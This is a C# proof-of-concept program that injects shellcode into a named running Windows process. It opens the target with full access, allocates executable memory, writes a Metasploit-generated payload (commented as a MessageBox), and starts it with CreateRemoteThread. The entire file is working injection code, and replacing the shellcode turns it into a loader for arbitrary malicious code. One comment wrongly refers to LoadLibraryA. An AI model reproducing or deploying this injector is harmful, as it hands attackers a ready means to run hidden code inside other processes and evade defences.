using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

	public class InjectionPoC
	{
		
		[DllImport("kernel32.dll")]
	    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
	
	    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	    public static extern IntPtr GetModuleHandle(string lpModuleName);
	
	    [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
	    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	
	    [DllImport("kernel32.dll", SetLastError = true)]
	    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
	
	    [DllImport("kernel32.dll")]
	    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		public static void Main(string[] args)
		{			
			if (args.Length == 0)
			{
			    System.Console.WriteLine("Please enter process name...");
			    System.Console.WriteLine("Usage: CodeInjectionPoC [process name]");
			    return;
			}

			Console.WriteLine("Start injection...");
			Process targetProcess;
			
			try {
				targetProcess = Process.GetProcessesByName(args[0])[0];	
			}
			catch {
				System.Console.WriteLine("Process " + args[0] + " not found!");
				return;
			}
						
			// Get process handler
			IntPtr process_handle = OpenProcess(0x1F0FFF, false, targetProcess.Id);
			
			// The MessageBox shellcode, generated with Metasploit
			string shellcodeStr =			
			"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"+
			"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"+
			"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"+
			"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"+
			"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"+
			"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"+
			"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"+
			"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"+
			"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"+
			"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"+
			"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"+
			"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"+
			"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"+
			"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"+
			"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"+
			"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"+
			"\x85\x04\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"+
			"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x68\x65\x6c"+
			"\x6c\x6f\x00\x68\x65\x6c\x6c\x6f\x00";

			
			// Convert shellcode string to byte array
	        Byte[] shellcode = new Byte[shellcodeStr.Length];
	        for (int i = 0; i < shellcodeStr.Length; i++) 
	        {
	            shellcode [i] = (Byte) shellcodeStr [i];
	        }					
			
			// Allocate a memory space in target process, big enough to store the shellcode
			IntPtr memory_allocation_variable  = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length),   0x00001000, 0x40);			

			// Write the shellcode
			UIntPtr bytesWritten;
			WriteProcessMemory(process_handle, memory_allocation_variable , shellcode, (uint)(shellcode.Length), out bytesWritten);			

			// Create a thread that will call LoadLibraryA with allocMemAddress as argument
			if (CreateRemoteThread(process_handle, IntPtr.Zero, 0, memory_allocation_variable , IntPtr.Zero, 0,IntPtr.Zero) != IntPtr.Zero) {
				Console.Write("Injection done!");	
			} else {
				Console.Write("Injection failed!");	
			}				
		}
	}